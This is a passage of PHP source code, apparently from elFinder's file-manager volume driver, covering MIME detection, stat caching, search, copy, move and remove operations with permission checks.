        if ($checkNum && preg_match('/(' . preg_quote($suffix, '/') . ')(\d*)$/i', $name, $m)) {
            $i = (int)$m[2];
            $name = substr($name, 0, strlen($name) - strlen($m[2]));
        } else {
            $i = $start;
            $name .= $suffix;
        }
        $max = $i + 100000;
        if (isset($lasts[$name])) {
            $i = max($i, $lasts[$name]);
        }
        while ($i <= $max) {
            $n = $name . ($i > 0 ? sprintf($this->options['uniqueNumFormat'], $i) : '') . $ext;
            if (!$this->isNameExists($this->joinPathCE($dir, $n))) {
                $this->clearcache();
                $lasts[$name] = ++$i;
                return $n;
            }
            $i++;
        }
        return $name . md5($dir) . $ext;
    }

    public function convEncIn($var = null, $restoreLocale = false, $unknown = '_')
    {
        return (!$this->encoding) ? $var : $this->convEnc($var, 'UTF-8', $this->encoding, $this->options['locale'], $restoreLocale, $unknown);
    }

    public function convEncOut($var = null, $restoreLocale = true, $unknown = '_')
    {
        return (!$this->encoding) ? $var : $this->convEnc($var, $this->encoding, 'UTF-8', $this->options['locale'], $restoreLocale, $unknown);
    }

    protected function convEnc($var, $from, $to, $locale, $restoreLocale, $unknown = '_')
    {
        if (strtoupper($from) !== strtoupper($to)) {
            if ($locale) {
                setlocale(LC_ALL, $locale);
            }
            if (is_array($var)) {
                $_ret = array();
                foreach ($var as $_k => $_v) {
                    $_ret[$_k] = $this->convEnc($_v, $from, $to, '', false, $unknown = '_');
                }
                $var = $_ret;
            } else {
                $_var = false;
                if (is_string($var)) {
                    $_var = $var;
                    $errlev = error_reporting();
                    error_reporting($errlev ^ E_NOTICE);
                    if (false !== ($_var = iconv($from, $to . '//TRANSLIT', $_var))) {
                        $_var = str_replace('?', $unknown, $_var);
                    }
                    error_reporting($errlev);
                }
                if ($_var !== false) {
                    $var = $_var;
                }
            }
            if ($restoreLocale) {
                setlocale(LC_ALL, elFinder::$locale);
            }
        }
        return $var;
    }

    public function mimeTypeNormalize($type, $name, $ext = '')
    {
        if ($ext === '') {
            $ext = (false === $pos = strrpos($name, '.')) ? '' : substr($name, $pos + 1);
        }
        $_checkKey = strtolower($ext . ':' . $type);
        if ($type === '') {
            $_keylen = strlen($_checkKey);
            foreach ($this->options['mimeMap'] as $_key => $_type) {
                if (substr($_key, 0, $_keylen) === $_checkKey) {
                    $type = $_type;
                    break;
                }
            }
        } else if (isset($this->options['mimeMap'][$_checkKey])) {
            $type = $this->options['mimeMap'][$_checkKey];
        } else {
            $_checkKey = strtolower($ext . ':*');
            if (isset($this->options['mimeMap'][$_checkKey])) {
                $type = $this->options['mimeMap'][$_checkKey];
            } else {
                $_checkKey = strtolower('*:' . $type);
                if (isset($this->options['mimeMap'][$_checkKey])) {
                    $type = $this->options['mimeMap'][$_checkKey];
                }
            }
        }
        return $type;
    }

    protected function getTempFile($path = '')
    {
        static $cache = array();
        $key = '';
        if ($path !== '') {
            $key = $this->id . '#' . $path;
            if (isset($cache[$key])) {
                return $cache[$key];
            }
        }
        if ($tmpdir = $this->getTempPath()) {
            $name = tempnam($tmpdir, 'ELF');
            if ($key) {
                $cache[$key] = $name;
            }
            $GLOBALS['elFinderTempFiles'][$name] = true;
            return $name;
        }
        return false;
    }

    protected function getWorkFile($path)
    {
        if ($wfp = $this->tmpfile()) {
            if ($fp = $this->_fopen($path)) {
                while (!feof($fp)) {
                    fwrite($wfp, fread($fp, 8192));
                }
                $info = stream_get_meta_data($wfp);
                fclose($wfp);
                if ($info && !empty($info['uri'])) {
                    return $info['uri'];
                }
            }
        }
        return false;
    }

    public function getImageSize($path, $mime = '')
    {
        $size = false;
        if ($mime === '' || strtolower(substr($mime, 0, 5)) === 'image') {
            if ($work = $this->getWorkFile($path)) {
                if ($size = getimagesize($work)) {
                    $size['dimensions'] = $size[0] . 'x' . $size[1];
                    $srcfp = fopen($work, 'rb');
                    $cArgs = elFinder::$currentArgs;
                    if (!empty($cArgs['target']) && $subImgLink = $this->getSubstituteImgLink($cArgs['target'], $size, $srcfp)) {
                        $size['url'] = $subImgLink;
                    }
                }
            }
            is_file($work) && unlink($work);
        }
        return $size;
    }

    protected function delTree($localpath)
    {
        foreach ($this->_scandir($localpath) as $p) {
            elFinder::checkAborted();
            $stat = $this->stat($this->convEncOut($p));
            $this->convEncIn();
            ($stat['mime'] === 'directory') ? $this->delTree($p) : $this->_unlink($p);
        }
        $res = $this->_rmdir($localpath);
        $res && $this->clearstatcache();
        return $res;
    }

    protected function getItemsInHand($hashes, $dir = null, $canLink = null)
    {
        static $banChrs = null;
        static $totalSize = 0;
        if  (is_null($banChrs)) {
            $banChrs = DIRECTORY_SEPARATOR !== '/'? array('\\', '/', ':', '*', '?', '"', '<', '>', '|') : array('\\', '/');
        }
        if (is_null($dir)) {
            $totalSize = 0;
            if (!$tmpDir = $this->getTempPath()) {
                return false;
            }
            $dir = tempnam($tmpDir, 'elf');
            if (!unlink($dir) || !mkdir($dir, 0700, true)) {
                return false;
            }
            register_shutdown_function(array($this, 'rmdirRecursive'), $dir);
        }
        if (is_null($canLink)) {
            $canLink = ($this instanceof elFinderVolumeLocalFileSystem);
        }
        elFinder::checkAborted();
        $res = true;
        $files = array();
        foreach ($hashes as $hash) {
            if (($file = $this->file($hash)) == false) {
                continue;
            }
            if (!$file['read']) {
                continue;
            }
            $name = $file['name'];
            $name = preg_replace('/[[:cntrl:]]+/', '', $name);
            $name = str_replace($banChrs, '_', $name);
            if (isset($files[$name])) {
                $name = preg_replace('/^(.*?)(\..*)?$/', '$1_' . $files[$name]++ . '$2', $name);
            } else {
                $files[$name] = 1;
            }
            $target = $dir . DIRECTORY_SEPARATOR . $name;
            if ($file['mime'] === 'directory') {
                $chashes = array();
                $_files = $this->scandir($hash);
                foreach ($_files as $_file) {
                    if ($file['read']) {
                        $chashes[] = $_file['hash'];
                    }
                }
                if (($res = mkdir($target, 0700, true)) && $chashes) {
                    $res = $this->getItemsInHand($chashes, $target, $canLink);
                }
                if (!$res) {
                    break;
                }
                !empty($file['ts']) && touch($target, $file['ts']);
            } else {
                $path = $this->decode($hash);
                if (!$canLink || !($canLink = $this->localFileSystemSymlink($path, $target))) {
                    if (file_exists($target)) {
                        unlink($target);
                    }
                    if ($fp = $this->fopenCE($path)) {
                        if ($tfp = fopen($target, 'wb')) {
                            $totalSize += stream_copy_to_stream($fp, $tfp);
                            fclose($tfp);
                        }
                        !empty($file['ts']) && touch($target, $file['ts']);
                        $this->fcloseCE($fp, $path);
                    }
                } else {
                    $totalSize += filesize($path);
                }
                if ($this->options['maxArcFilesSize'] > 0 && $this->options['maxArcFilesSize'] < $totalSize) {
                    $res = $this->setError(elFinder::ERROR_ARC_MAXSIZE);
                }
            }
        }
        return $res ? $dir : false;
    }

    protected function attr($path, $name, $val = null, $isDir = null)
    {
        if (!isset($this->defaults[$name])) {
            return false;
        }
        $relpath = $this->relpathCE($path);
        if ($this->separator !== '/') {
            $relpath = str_replace($this->separator, '/', $relpath);
        }
        $relpath = '/' . $relpath;
        $perm = null;
        if ($this->access) {
            $perm = call_user_func($this->access, $name, $path, $this->options['accessControlData'], $this, $isDir, $relpath);
            if ($perm !== null) {
                return !!$perm;
            }
        }
        foreach ($this->attributes as $attrs) {
            if (isset($attrs[$name]) && isset($attrs['pattern']) && preg_match($attrs['pattern'], $relpath)) {
                $perm = $attrs[$name];
                break;
            }
        }
        return $perm === null ? (is_null($val) ? $this->defaults[$name] : $val) : !!$perm;
    }

    protected function allowCreate($dir, $name, $isDir = null)
    {
        return $this->attr($this->joinPathCE($dir, $name), 'write', true, $isDir);
    }

    protected function allowPutMime($mime)
    {
        $allow = $this->mimeAccepted($mime, $this->uploadAllow, null);
        $deny = $this->mimeAccepted($mime, $this->uploadDeny, null);
        if (strtolower($this->uploadOrder[0]) == 'allow') {
            $res = false;
            if (!$deny && ($allow === true)) {
                $res = true;
            }
        } else {
            $res = true;
            if (($deny === true) && !$allow) {
                $res = false;
            }
        }
        return $res;
    }

    protected function stat($path)
    {
        if ($path === false || is_null($path)) {
            return false;
        }
        $is_root = ($path == $this->root);
        if ($is_root) {
            $rootKey = $this->getRootstatCachekey();
            if ($this->sessionCaching['rootstat'] && !isset($this->sessionCache['rootstat'])) {
                $this->sessionCache['rootstat'] = array();
            }
            if (!isset($this->cache[$path]) && !$this->isMyReload()) {
                if ($this->sessionCaching['rootstat'] && isset($this->sessionCache['rootstat'][$rootKey])) {
                    if ($ret = $this->sessionCache['rootstat'][$rootKey]) {
                        if ($this->options['rootRev'] === $ret['rootRev']) {
                            if (isset($this->options['phash'])) {
                                $ret['isroot'] = 1;
                                $ret['phash'] = $this->options['phash'];
                            }
                            return $ret;
                        }
                    }
                }
            }
        }
        $rootSessCache = false;
        if (isset($this->cache[$path])) {
            $ret = $this->cache[$path];
        } else {
            if ($is_root && !empty($this->options['rapidRootStat']) && is_array($this->options['rapidRootStat']) && !$this->needOnline) {
                $ret = $this->updateCache($path, $this->options['rapidRootStat'], true);
            } else {
                $ret = $this->updateCache($path, $this->convEncOut($this->_stat($this->convEncIn($path))), true);
                if ($is_root && !empty($rootKey) && $this->sessionCaching['rootstat']) {
                    $rootSessCache = true;
                }
            }
        }
        if ($is_root) {
            if ($ret) {
                $this->rootModified = false;
                if ($rootSessCache) {
                    $this->sessionCache['rootstat'][$rootKey] = $ret;
                }
                if (isset($this->options['phash'])) {
                    $ret['isroot'] = 1;
                    $ret['phash'] = $this->options['phash'];
                }
            } else if (!empty($rootKey) && $this->sessionCaching['rootstat']) {
                unset($this->sessionCache['rootstat'][$rootKey]);
            }
        }
        return $ret;
    }

    protected function getRootStatExtra()
    {
        $stat = array();
        if ($this->rootName) {
            $stat['name'] = $this->rootName;
        }
        $stat['rootRev'] = $this->options['rootRev'];
        $stat['options'] = $this->options(null);
        return $stat;
    }

    protected function isNameExists($path)
    {
        return $this->stat($path);
    }

    protected function updateCache($path, $stat)
    {
        if (empty($stat) || !is_array($stat)) {
            return $this->cache[$path] = array();
        }
        if (func_num_args() > 2) {
            $fromStat = func_get_arg(2);
        } else {
            $fromStat = false;
        }
        $stat['hash'] = $this->encode($path);
        $root = $path == $this->root;
        $parent = '';
        if ($root) {
            $stat = array_merge($stat, $this->getRootStatExtra());
        } else {
            if (!isset($stat['name']) || $stat['name'] === '') {
                $stat['name'] = $this->basenameCE($path);
            }
            if (empty($stat['phash'])) {
                $parent = $this->dirnameCE($path);
                $stat['phash'] = $this->encode($parent);
            } else {
                $parent = $this->decode($stat['phash']);
            }
        }
        if (isset($stat['name']) && !$jeName = json_encode($stat['name'])) {
            return $this->cache[$path] = array();
        }
        if ($this->options['utf8fix'] && $this->options['utf8patterns'] && $this->options['utf8replace']) {
            $stat['name'] = json_decode(str_replace($this->options['utf8patterns'], $this->options['utf8replace'], $jeName));
        }
        if (!isset($stat['size'])) {
            $stat['size'] = 'unknown';
        }
        $mime = isset($stat['mime']) ? $stat['mime'] : '';
        if ($isDir = ($mime === 'directory')) {
            $stat['volumeid'] = $this->id;
        } else {
            if (empty($stat['mime']) || $stat['size'] == 0) {
                $stat['mime'] = $this->mimetype($stat['name'], true, $stat['size'], $mime);
            } else {
                $stat['mime'] = $this->mimeTypeNormalize($stat['mime'], $stat['name']);
            }
        }
        $stat['read'] = intval($this->attr($path, 'read', isset($stat['read']) ? !!$stat['read'] : null, $isDir));
        $stat['write'] = intval($this->attr($path, 'write', isset($stat['write']) ? !!$stat['write'] : null, $isDir));
        if ($root) {
            $stat['locked'] = 1;
            if ($this->options['type'] !== '') {
                $stat['type'] = $this->options['type'];
            }
        } else {
            if (!isset($stat['locked'])) {
                $pstat = $this->stat($parent);
                if (isset($pstat['write']) && !$pstat['write']) {
                    $stat['locked'] = true;
                }
            }
            if ($this->attr($path, 'locked', isset($stat['locked']) ? !!$stat['locked'] : null, $isDir)) {
                $stat['locked'] = 1;
            } else {
                unset($stat['locked']);
            }
        }
        if ($root) {
            unset($stat['hidden']);
        } elseif ($this->attr($path, 'hidden', isset($stat['hidden']) ? !!$stat['hidden'] : null, $isDir)
            || !$this->mimeAccepted($stat['mime'])) {
            $stat['hidden'] = 1;
        } else {
            unset($stat['hidden']);
        }
        if ($stat['read'] && empty($stat['hidden'])) {
            if ($isDir) {
                if ($parent) {
                    $this->updateSubdirsCache($parent, true);
                }
                if ($this->options['checkSubfolders']) {
                    if (!isset($stat['dirs']) && intval($this->options['checkSubfolders']) === -1) {
                        $stat['dirs'] = -1;
                    }
                    if (isset($stat['dirs'])) {
                        if ($stat['dirs']) {
                            if ($stat['dirs'] == -1) {
                                $stat['dirs'] = ($this->sessionCaching['subdirs'] && isset($this->sessionCache['subdirs'][$path])) ? (int)$this->sessionCache['subdirs'][$path] : -1;
                            } else {
                                $stat['dirs'] = 1;
                            }
                        } else {
                            unset($stat['dirs']);
                        }
                    } elseif (!empty($stat['alias']) && !empty($stat['target'])) {
                        $stat['dirs'] = isset($this->cache[$stat['target']])
                            ? intval(isset($this->cache[$stat['target']]['dirs']))
                            : $this->subdirsCE($stat['target']);
                    } elseif ($this->subdirsCE($path)) {
                        $stat['dirs'] = 1;
                    }
                } else {
                    $stat['dirs'] = 1;
                }
                if ($this->options['dirUrlOwn'] === true) {
                    $stat['url'] = null;
                } else if ($this->options['dirUrlOwn'] === 'hide') {
                    $stat['url'] = '';
                }
            } else {
                $p = isset($stat['target']) ? $stat['target'] : $path;
                if ($this->tmbURL && !isset($stat['tmb']) && $this->canCreateTmb($p, $stat)) {
                    $tmb = $this->gettmb($p, $stat);
                    $stat['tmb'] = $tmb ? $tmb : 1;
                }
            }
            if (!isset($stat['url']) && $this->URL && $this->encoding) {
                $_path = str_replace($this->separator, '/', substr($path, strlen($this->root) + 1));
                $stat['url'] = rtrim($this->URL, '/') . '/' . str_replace('%2F', '/', rawurlencode((substr(PHP_OS, 0, 3) === 'WIN') ? $_path : $this->convEncIn($_path, true)));
            }
        } else {
            if ($isDir) {
                unset($stat['dirs']);
            }
        }
        if (!empty($stat['alias']) && !empty($stat['target'])) {
            $stat['thash'] = $this->encode($stat['target']);
            unset($stat['target']);
        }
        $this->cache[$path] = $stat;
        if (!$fromStat && $root && $this->sessionCaching['rootstat']) {
            $this->stat($path);
        }
        return $stat;
    }

    protected function cacheDir($path)
    {
        $this->dirsCache[$path] = array();
        $hasDir = false;
        foreach ($this->scandirCE($path) as $p) {
            if (($stat = $this->stat($p)) && empty($stat['hidden'])) {
                if (!$hasDir && $stat['mime'] === 'directory') {
                    $hasDir = true;
                }
                $this->dirsCache[$path][] = $p;
            }
        }
        $this->updateSubdirsCache($path, $hasDir);
    }

    protected function clearcache()
    {
        $this->cache = $this->dirsCache = array();
    }

    protected function mimetype($path, $name = '', $size = null, $mime = null)
    {
        $type = '';
        $nameCheck = false;
        if ($name === '') {
            $name = $path;
        } else if ($name === true) {
            $name = $path;
            $nameCheck = true;
        }
        if (!$this instanceof elFinderVolumeLocalFileSystem) {
            $nameCheck = true;
        }
        $ext = (false === $pos = strrpos($name, '.')) ? '' : strtolower(substr($name, $pos + 1));
        if (!$nameCheck && $size === null) {
            $size = file_exists($path) ? filesize($path) : -1;
        }
        if (!$nameCheck && is_readable($path) && $size > 0) {
            if ($this->mimeDetect === 'finfo') {
                $type = finfo_file($this->finfo, $path);
            } else if ($this->mimeDetect === 'mime_content_type') {
                $type = mime_content_type($path);
            }
            if ($type) {
                $type = explode(';', $type);
                $type = trim($type[0]);
                if ($ext && preg_match('~^application/(?:octet-stream|(?:x-)?zip|xml)$~', $type)) {
                    if (!elFinderVolumeDriver::$mimetypesLoaded) {
                        elFinderVolumeDriver::loadMimeTypes();
                    }
                    if (isset(elFinderVolumeDriver::$mimetypes[$ext])) {
                        $type = elFinderVolumeDriver::$mimetypes[$ext];
                    }
                } else if ($ext === 'js' && preg_match('~^text/~', $type)) {
                    $type = 'text/javascript';
                }
            }
        }
        if (!$type) {
            $type = elFinderVolumeDriver::mimetypeInternalDetect($name);
            if ($type === 'unknown') {
                if ($mime) {
                    $type = $mime;
                } else {
                    $type = ($size == 0) ? 'text/plain' : $this->options['mimeTypeUnknown'];
                }
            }
        }
        $type = $this->mimeTypeNormalize($type, $name, $ext);
        return $type;
    }

    static protected function loadMimeTypes($mimeTypesFile = '')
    {
        if (!elFinderVolumeDriver::$mimetypesLoaded) {
            elFinderVolumeDriver::$mimetypesLoaded = true;
            $file = false;
            if (!empty($mimeTypesFile) && file_exists($mimeTypesFile)) {
                $file = $mimeTypesFile;
            } elseif (elFinder::$defaultMimefile && file_exists(elFinder::$defaultMimefile)) {
                $file = elFinder::$defaultMimefile;
            } elseif (file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'mime.types')) {
                $file = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'mime.types';
            } elseif (file_exists(dirname(dirname(__FILE__)) . DIRECTORY_SEPARATOR . 'mime.types')) {
                $file = dirname(dirname(__FILE__)) . DIRECTORY_SEPARATOR . 'mime.types';
            }
            if ($file && file_exists($file)) {
                $mimecf = file($file);
                foreach ($mimecf as $line_num => $line) {
                    if (!preg_match('/^\s*#/', $line)) {
                        $mime = preg_split('/\s+/', $line, -1, PREG_SPLIT_NO_EMPTY);
                        for ($i = 1, $size = count($mime); $i < $size; $i++) {
                            if (!isset(self::$mimetypes[$mime[$i]])) {
                                self::$mimetypes[$mime[$i]] = $mime[0];
                            }
                        }
                    }
                }
            }
        }
    }

    static protected function mimetypeInternalDetect($path = '')
    {
        if (!elFinderVolumeDriver::$mimetypesLoaded) {
            elFinderVolumeDriver::loadMimeTypes();
        }
        $ext = '';
        if ($path) {
            $pinfo = pathinfo($path);
            $ext = isset($pinfo['extension']) ? strtolower($pinfo['extension']) : '';
        }
        $res = ($ext && isset(elFinderVolumeDriver::$mimetypes[$ext])) ? elFinderVolumeDriver::$mimetypes[$ext] : 'unknown';
        if ($res === 'unknown' && strpos($pinfo['filename'], '.')) {
            return elFinderVolumeDriver::mimetypeInternalDetect($pinfo['filename']);
        } else {
            return $res;
        }
    }

    protected function countSize($path)
    {
        elFinder::checkAborted();
        $result = array('size' => 0, 'files' => 0, 'dirs' => 0);
        $stat = $this->stat($path);
        if (empty($stat) || !$stat['read'] || !empty($stat['hidden'])) {
            $result['size'] = 'unknown';
            return $result;
        }
        if ($stat['mime'] !== 'directory') {
            $result['size'] = intval($stat['size']);
            $result['files'] = 1;
            return $result;
        }
        $result['dirs'] = 1;
        $subdirs = $this->options['checkSubfolders'];
        $this->options['checkSubfolders'] = true;
        foreach ($this->getScandir($path) as $stat) {
            if ($isDir = ($stat['mime'] === 'directory' && $stat['read'])) {
                ++$result['dirs'];
            } else {
                ++$result['files'];
            }
            $res = $isDir
                ? $this->countSize($this->decode($stat['hash']))
                : (isset($stat['size']) ? array('size' => intval($stat['size'])) : array());
            if (!empty($res['size']) && is_numeric($res['size'])) {
                $result['size'] += $res['size'];
            }
            if (!empty($res['files']) && is_numeric($res['files'])) {
                $result['files'] += $res['files'];
            }
            if (!empty($res['dirs']) && is_numeric($res['dirs'])) {
                $result['dirs'] += $res['dirs'];
                --$result['dirs'];
            }
        }
        $this->options['checkSubfolders'] = $subdirs;
        return $result;
    }

    protected function isSameType($mime1, $mime2)
    {
        return ($mime1 == 'directory' && $mime1 == $mime2) || ($mime1 != 'directory' && $mime2 != 'directory');
    }

    protected function closestByAttr($path, $attr, $val)
    {
        $stat = $this->stat($path);
        if (empty($stat)) {
            return false;
        }
        $v = isset($stat[$attr]) ? $stat[$attr] : false;
        if ($v == $val) {
            return $path;
        }
        return $stat['mime'] == 'directory'
            ? $this->childsByAttr($path, $attr, $val)
            : false;
    }

    protected function childsByAttr($path, $attr, $val)
    {
        foreach ($this->scandirCE($path) as $p) {
            if (($_p = $this->closestByAttr($p, $attr, $val)) != false) {
                return $_p;
            }
        }
        return false;
    }

    protected function isMyReload($target = '', $ARGtarget = '')
    {
        if ($this->rootModified || (!empty($this->ARGS['cmd']) && $this->ARGS['cmd'] === 'parents')) {
            return true;
        }
        if (!empty($this->ARGS['reload'])) {
            if ($ARGtarget === '') {
                $ARGtarget = isset($this->ARGS['target']) ? $this->ARGS['target']
                    : ((isset($this->ARGS['targets']) && is_array($this->ARGS['targets']) && count($this->ARGS['targets']) === 1) ?
                        $this->ARGS['targets'][0] : '');
            }
            if ($ARGtarget !== '') {
                $ARGtarget = strval($ARGtarget);
                if ($target === '') {
                    return (strpos($ARGtarget, $this->id) === 0);
                } else {
                    $target = strval($target);
                    return ($target === $ARGtarget);
                }
            }
        }
        return false;
    }

    protected function updateSubdirsCache($path, $subdirs)
    {
        if (isset($this->cache[$path])) {
            if ($subdirs) {
                $this->cache[$path]['dirs'] = 1;
            } else {
                unset($this->cache[$path]['dirs']);
            }
        }
        if ($this->sessionCaching['subdirs']) {
            $this->sessionCache['subdirs'][$path] = $subdirs;
        }
        if ($this->sessionCaching['rootstat'] && $path == $this->root) {
            unset($this->sessionCache['rootstat'][$this->getRootstatCachekey()]);
        }
    }

    protected function getScandir($path)
    {
        $files = array();
        !isset($this->dirsCache[$path]) && $this->cacheDir($path);
        foreach ($this->dirsCache[$path] as $p) {
            if (($stat = $this->stat($p)) && empty($stat['hidden'])) {
                $files[] = $stat;
            }
        }
        return $files;
    }

    protected function gettree($path, $deep, $exclude = '')
    {
        $dirs = array();
        !isset($this->dirsCache[$path]) && $this->cacheDir($path);
        foreach ($this->dirsCache[$path] as $p) {
            $stat = $this->stat($p);
            if ($stat && empty($stat['hidden']) && $p != $exclude && $stat['mime'] == 'directory') {
                $dirs[] = $stat;
                if ($deep > 0 && !empty($stat['dirs'])) {
                    $dirs = array_merge($dirs, $this->gettree($p, $deep - 1));
                }
            }
        }
        return $dirs;
    }

    protected function doSearch($path, $q, $mimes)
    {
        $result = array();
        $matchMethod = empty($this->doSearchCurrentQuery['matchMethod']) ? 'searchMatchName' : $this->doSearchCurrentQuery['matchMethod'];
        $timeout = $this->options['searchTimeout'] ? $this->searchStart + $this->options['searchTimeout'] : 0;
        if ($timeout && $timeout < time()) {
            $this->setError(elFinder::ERROR_SEARCH_TIMEOUT, $this->path($this->encode($path)));
            return $result;
        }
        foreach ($this->scandirCE($path) as $p) {
            elFinder::extendTimeLimit($this->options['searchTimeout'] + 30);
            if ($timeout && ($this->error || $timeout < time())) {
                !$this->error && $this->setError(elFinder::ERROR_SEARCH_TIMEOUT, $this->path($this->encode($path)));
                break;
            }
            $stat = $this->stat($p);
            if (!$stat) {
                continue;
            }
            if (!empty($stat['hidden']) || !$this->mimeAccepted($stat['mime'], $mimes)) {
                continue;
            }
            $name = $stat['name'];
            if ($this->doSearchCurrentQuery['excludes']) {
                foreach ($this->doSearchCurrentQuery['excludes'] as $exclude) {
                    if ($this->stripos($name, $exclude) !== false) {
                        continue 2;
                    }
                }
            }
            if ((!$mimes || $stat['mime'] !== 'directory') && $this->$matchMethod($name, $q, $p) !== false) {
                $stat['path'] = $this->path($stat['hash']);
                if ($this->URL && !isset($stat['url'])) {
                    $path = str_replace($this->separator, '/', substr($p, strlen($this->root) + 1));
                    if ($this->encoding) {
                        $path = str_replace('%2F', '/', rawurlencode($this->convEncIn($path, true)));
                    } else {
                        $path = str_replace('%2F', '/', rawurlencode($path));
                    }
                    $stat['url'] = $this->URL . $path;
                }
                $result[] = $stat;
            }
            if ($stat['mime'] == 'directory' && $stat['read'] && !isset($stat['alias'])) {
                if (!$this->options['searchExDirReg'] || !preg_match($this->options['searchExDirReg'], $p)) {
                    $result = array_merge($result, $this->doSearch($p, $q, $mimes));
                }
            }
        }
        return $result;
    }

    protected function copy($src, $dst, $name)
    {
        elFinder::checkAborted();
        $srcStat = $this->stat($src);
        if (!empty($srcStat['thash'])) {
            $target = $this->decode($srcStat['thash']);
            if (!$this->inpathCE($target, $this->root)) {
                return $this->setError(elFinder::ERROR_COPY, $this->path($srcStat['hash']), elFinder::ERROR_MKOUTLINK);
            }
            $stat = $this->stat($target);
            $this->clearcache();
            return $stat && $this->symlinkCE($target, $dst, $name)
                ? $this->joinPathCE($dst, $name)
                : $this->setError(elFinder::ERROR_COPY, $this->path($srcStat['hash']));
        }
        if ($srcStat['mime'] === 'directory') {
            $testStat = $this->isNameExists($this->joinPathCE($dst, $name));
            $this->clearcache();
            if (($testStat && $testStat['mime'] !== 'directory') || (!$testStat && !$testStat = $this->mkdir($this->encode($dst), $name))) {
                return $this->setError(elFinder::ERROR_COPY, $this->path($srcStat['hash']));
            }
            $dst = $this->decode($testStat['hash']);
            $stime = microtime(true);
            foreach ($this->getScandir($src) as $stat) {
                if (empty($stat['hidden'])) {
                    $ctime = microtime(true);
                    if (($ctime - $stime) > 2) {
                        $stime = $ctime;
                        elFinder::checkAborted();
                    }
                    $name = $stat['name'];
                    $_src = $this->decode($stat['hash']);
                    if (!$this->copy($_src, $dst, $name)) {
                        $this->remove($dst, true);
                        return $this->setError($this->error, elFinder::ERROR_COPY, $this->_path($src));
                    }
                }
            }
            $this->added[] = $testStat;
            return $dst;
        }
        if ($this->options['copyJoin']) {
            $test = $this->joinPathCE($dst, $name);
            if ($this->isNameExists($test)) {
                $this->remove($test);
            }
        }
        if ($res = $this->convEncOut($this->_copy($this->convEncIn($src), $this->convEncIn($dst), $this->convEncIn($name)))) {
            $path = is_string($res) ? $res : $this->joinPathCE($dst, $name);
            $this->clearstatcache();
            $this->added[] = $this->stat($path);
            return $path;
        }
        return $this->setError(elFinder::ERROR_COPY, $this->path($srcStat['hash']));
    }

    protected function move($src, $dst, $name)
    {
        $stat = $this->stat($src);
        $stat['realpath'] = $src;
        $this->rmTmb($stat);
        $this->clearcache();
        $res = $this->convEncOut($this->_move($this->convEncIn($src), $this->convEncIn($dst), $this->convEncIn($name)));
        if (!$res) {
            if ($this->copy($src, $dst, $name)) {
                $res = $this->remove($src);
            }
        }
        if ($res) {
            $this->clearstatcache();
            if ($stat['mime'] === 'directory') {
                $this->updateSubdirsCache($dst, true);
            }
            $path = is_string($res) ? $res : $this->joinPathCE($dst, $name);
            $this->added[] = $this->stat($path);
            $this->removed[] = $stat;
            return $path;
        }
        return $this->setError(elFinder::ERROR_MOVE, $this->path($stat['hash']));
    }

    protected function copyFrom($volume, $src, $destination, $name)
    {
        elFinder::checkAborted();
        if (($source = $volume->file($src)) == false) {
            return $this->addError(elFinder::ERROR_COPY, '#' . $src, $volume->error());
        }
        $srcIsDir = ($source['mime'] === 'directory');
        $errpath = $volume->path($source['hash']);
        $errors = array();
        try {
            $thash = $this->encode($destination);
            elFinder::$instance->trigger('paste.copyfrom', array(&$thash, &$name, '', elFinder::$instance, $this), $errors);
        } catch (elFinderTriggerException $e) {
            return $this->addError(elFinder::ERROR_COPY, $name, $errors);
        }
        if (!$this->nameAccepted($name, $srcIsDir)) {
            return $this->addError(elFinder::ERROR_COPY, $name, $srcIsDir ? elFinder::ERROR_INVALID_DIRNAME : elFinder::ERROR_INVALID_NAME);
        }
        if (!$this->allowCreate($destination, $name, $srcIsDir)) {
            return $this->addError(elFinder::ERROR_COPY, $name, elFinder::ERROR_PERM_DENIED);
        }
        if (!$source['read']) {
            return $this->addError(elFinder::ERROR_COPY, $errpath, elFinder::ERROR_PERM_DENIED);
        }
        if ($srcIsDir) {
            $test = $this->isNameExists($this->joinPathCE($destination, $name));
            $this->clearcache();
            if (($test && $test['mime'] != 'directory') || (!$test && !$test = $this->mkdir($this->encode($destination), $name))) {
                return $this->addError(elFinder::ERROR_COPY, $errpath);
            }
            $path = $this->decode($test['hash']);
            foreach ($volume->scandir($src) as $entr) {
                $this->copyFrom($volume, $entr['hash'], $path, $entr['name']);
            }
            $this->added[] = $test;
        } else {
            if (!isset($source['size']) || $source['size'] > $this->uploadMaxSize) {
                return $this->setError(elFinder::ERROR_UPLOAD_FILE_SIZE);
            }
            $mimeByName = $this->mimetype($source['name'], true);
            if ($source['mime'] === $mimeByName) {
                $mimeByName = '';
            }
            if (!$this->allowPutMime($source['mime']) || ($mimeByName && !$this->allowPutMime($mimeByName))) {
                return $this->addError(elFinder::ERROR_UPLOAD_FILE_MIME, $errpath);
            }
            if (strpos($source['mime'], 'image') === 0 && ($dim = $volume->dimensions($src))) {
                if (is_array($dim)) {
                    $dim = isset($dim['dim']) ? $dim['dim'] : null;
                }
                if ($dim) {
                    $s = explode('x', $dim);
                    $source['width'] = $s[0];
                    $source['height'] = $s[1];
                }
            }
            if (($fp = $volume->open($src)) == false
                || ($path = $this->saveCE($fp, $destination, $name, $source)) == false) {
                $fp && $volume->close($fp, $src);
                return $this->addError(elFinder::ERROR_COPY, $errpath);
            }
            $volume->close($fp, $src);
            $this->added[] = $this->stat($path);
        }
        return $path;
    }

    protected function remove($path, $force = false)
    {
        $stat = $this->stat($path);
        if (empty($stat)) {
            return $this->setError(elFinder::ERROR_RM, $this->relpathCE($path), elFinder::ERROR_FILE_NOT_FOUND);
        }
        $stat['realpath'] = $path;
        $this->rmTmb($stat);
        $this->clearcache();
        if (!$force && !empty($stat['locked'])) {
            return $this->setError(elFinder::ERROR_LOCKED, $this->path($stat['hash']));
        }
        if ($stat['mime'] == 'directory' && empty($stat['thash'])) {
            $ret = $this->delTree($this->convEncIn($path));
            $this->convEncOut();
            if (!$ret) {
                return $this->setError(elFinder::ERROR_RM, $this->path($stat['hash']));
            }
        } else {
            if ($this->convEncOut(!$this->_unlink($this->convEncIn($path)))) {
                return $this->setError(elFinder::ERROR_RM, $this->path($stat['hash']));
            }
            $this->clearstatcache();
        }
        $this->removed[] = $stat;
        return true;
    }

    protected function tmbname($stat)
    {
        $name = $stat['hash'] . (isset($stat['ts']) ? $stat['ts'] : '') . '.png';
        if (strlen($name) > 255) {
            $name = $this->id . md5($stat['hash']) . $stat['ts'] . '.png';
        }
        return $name;
    }

    protected function gettmb($path, $stat)
    {
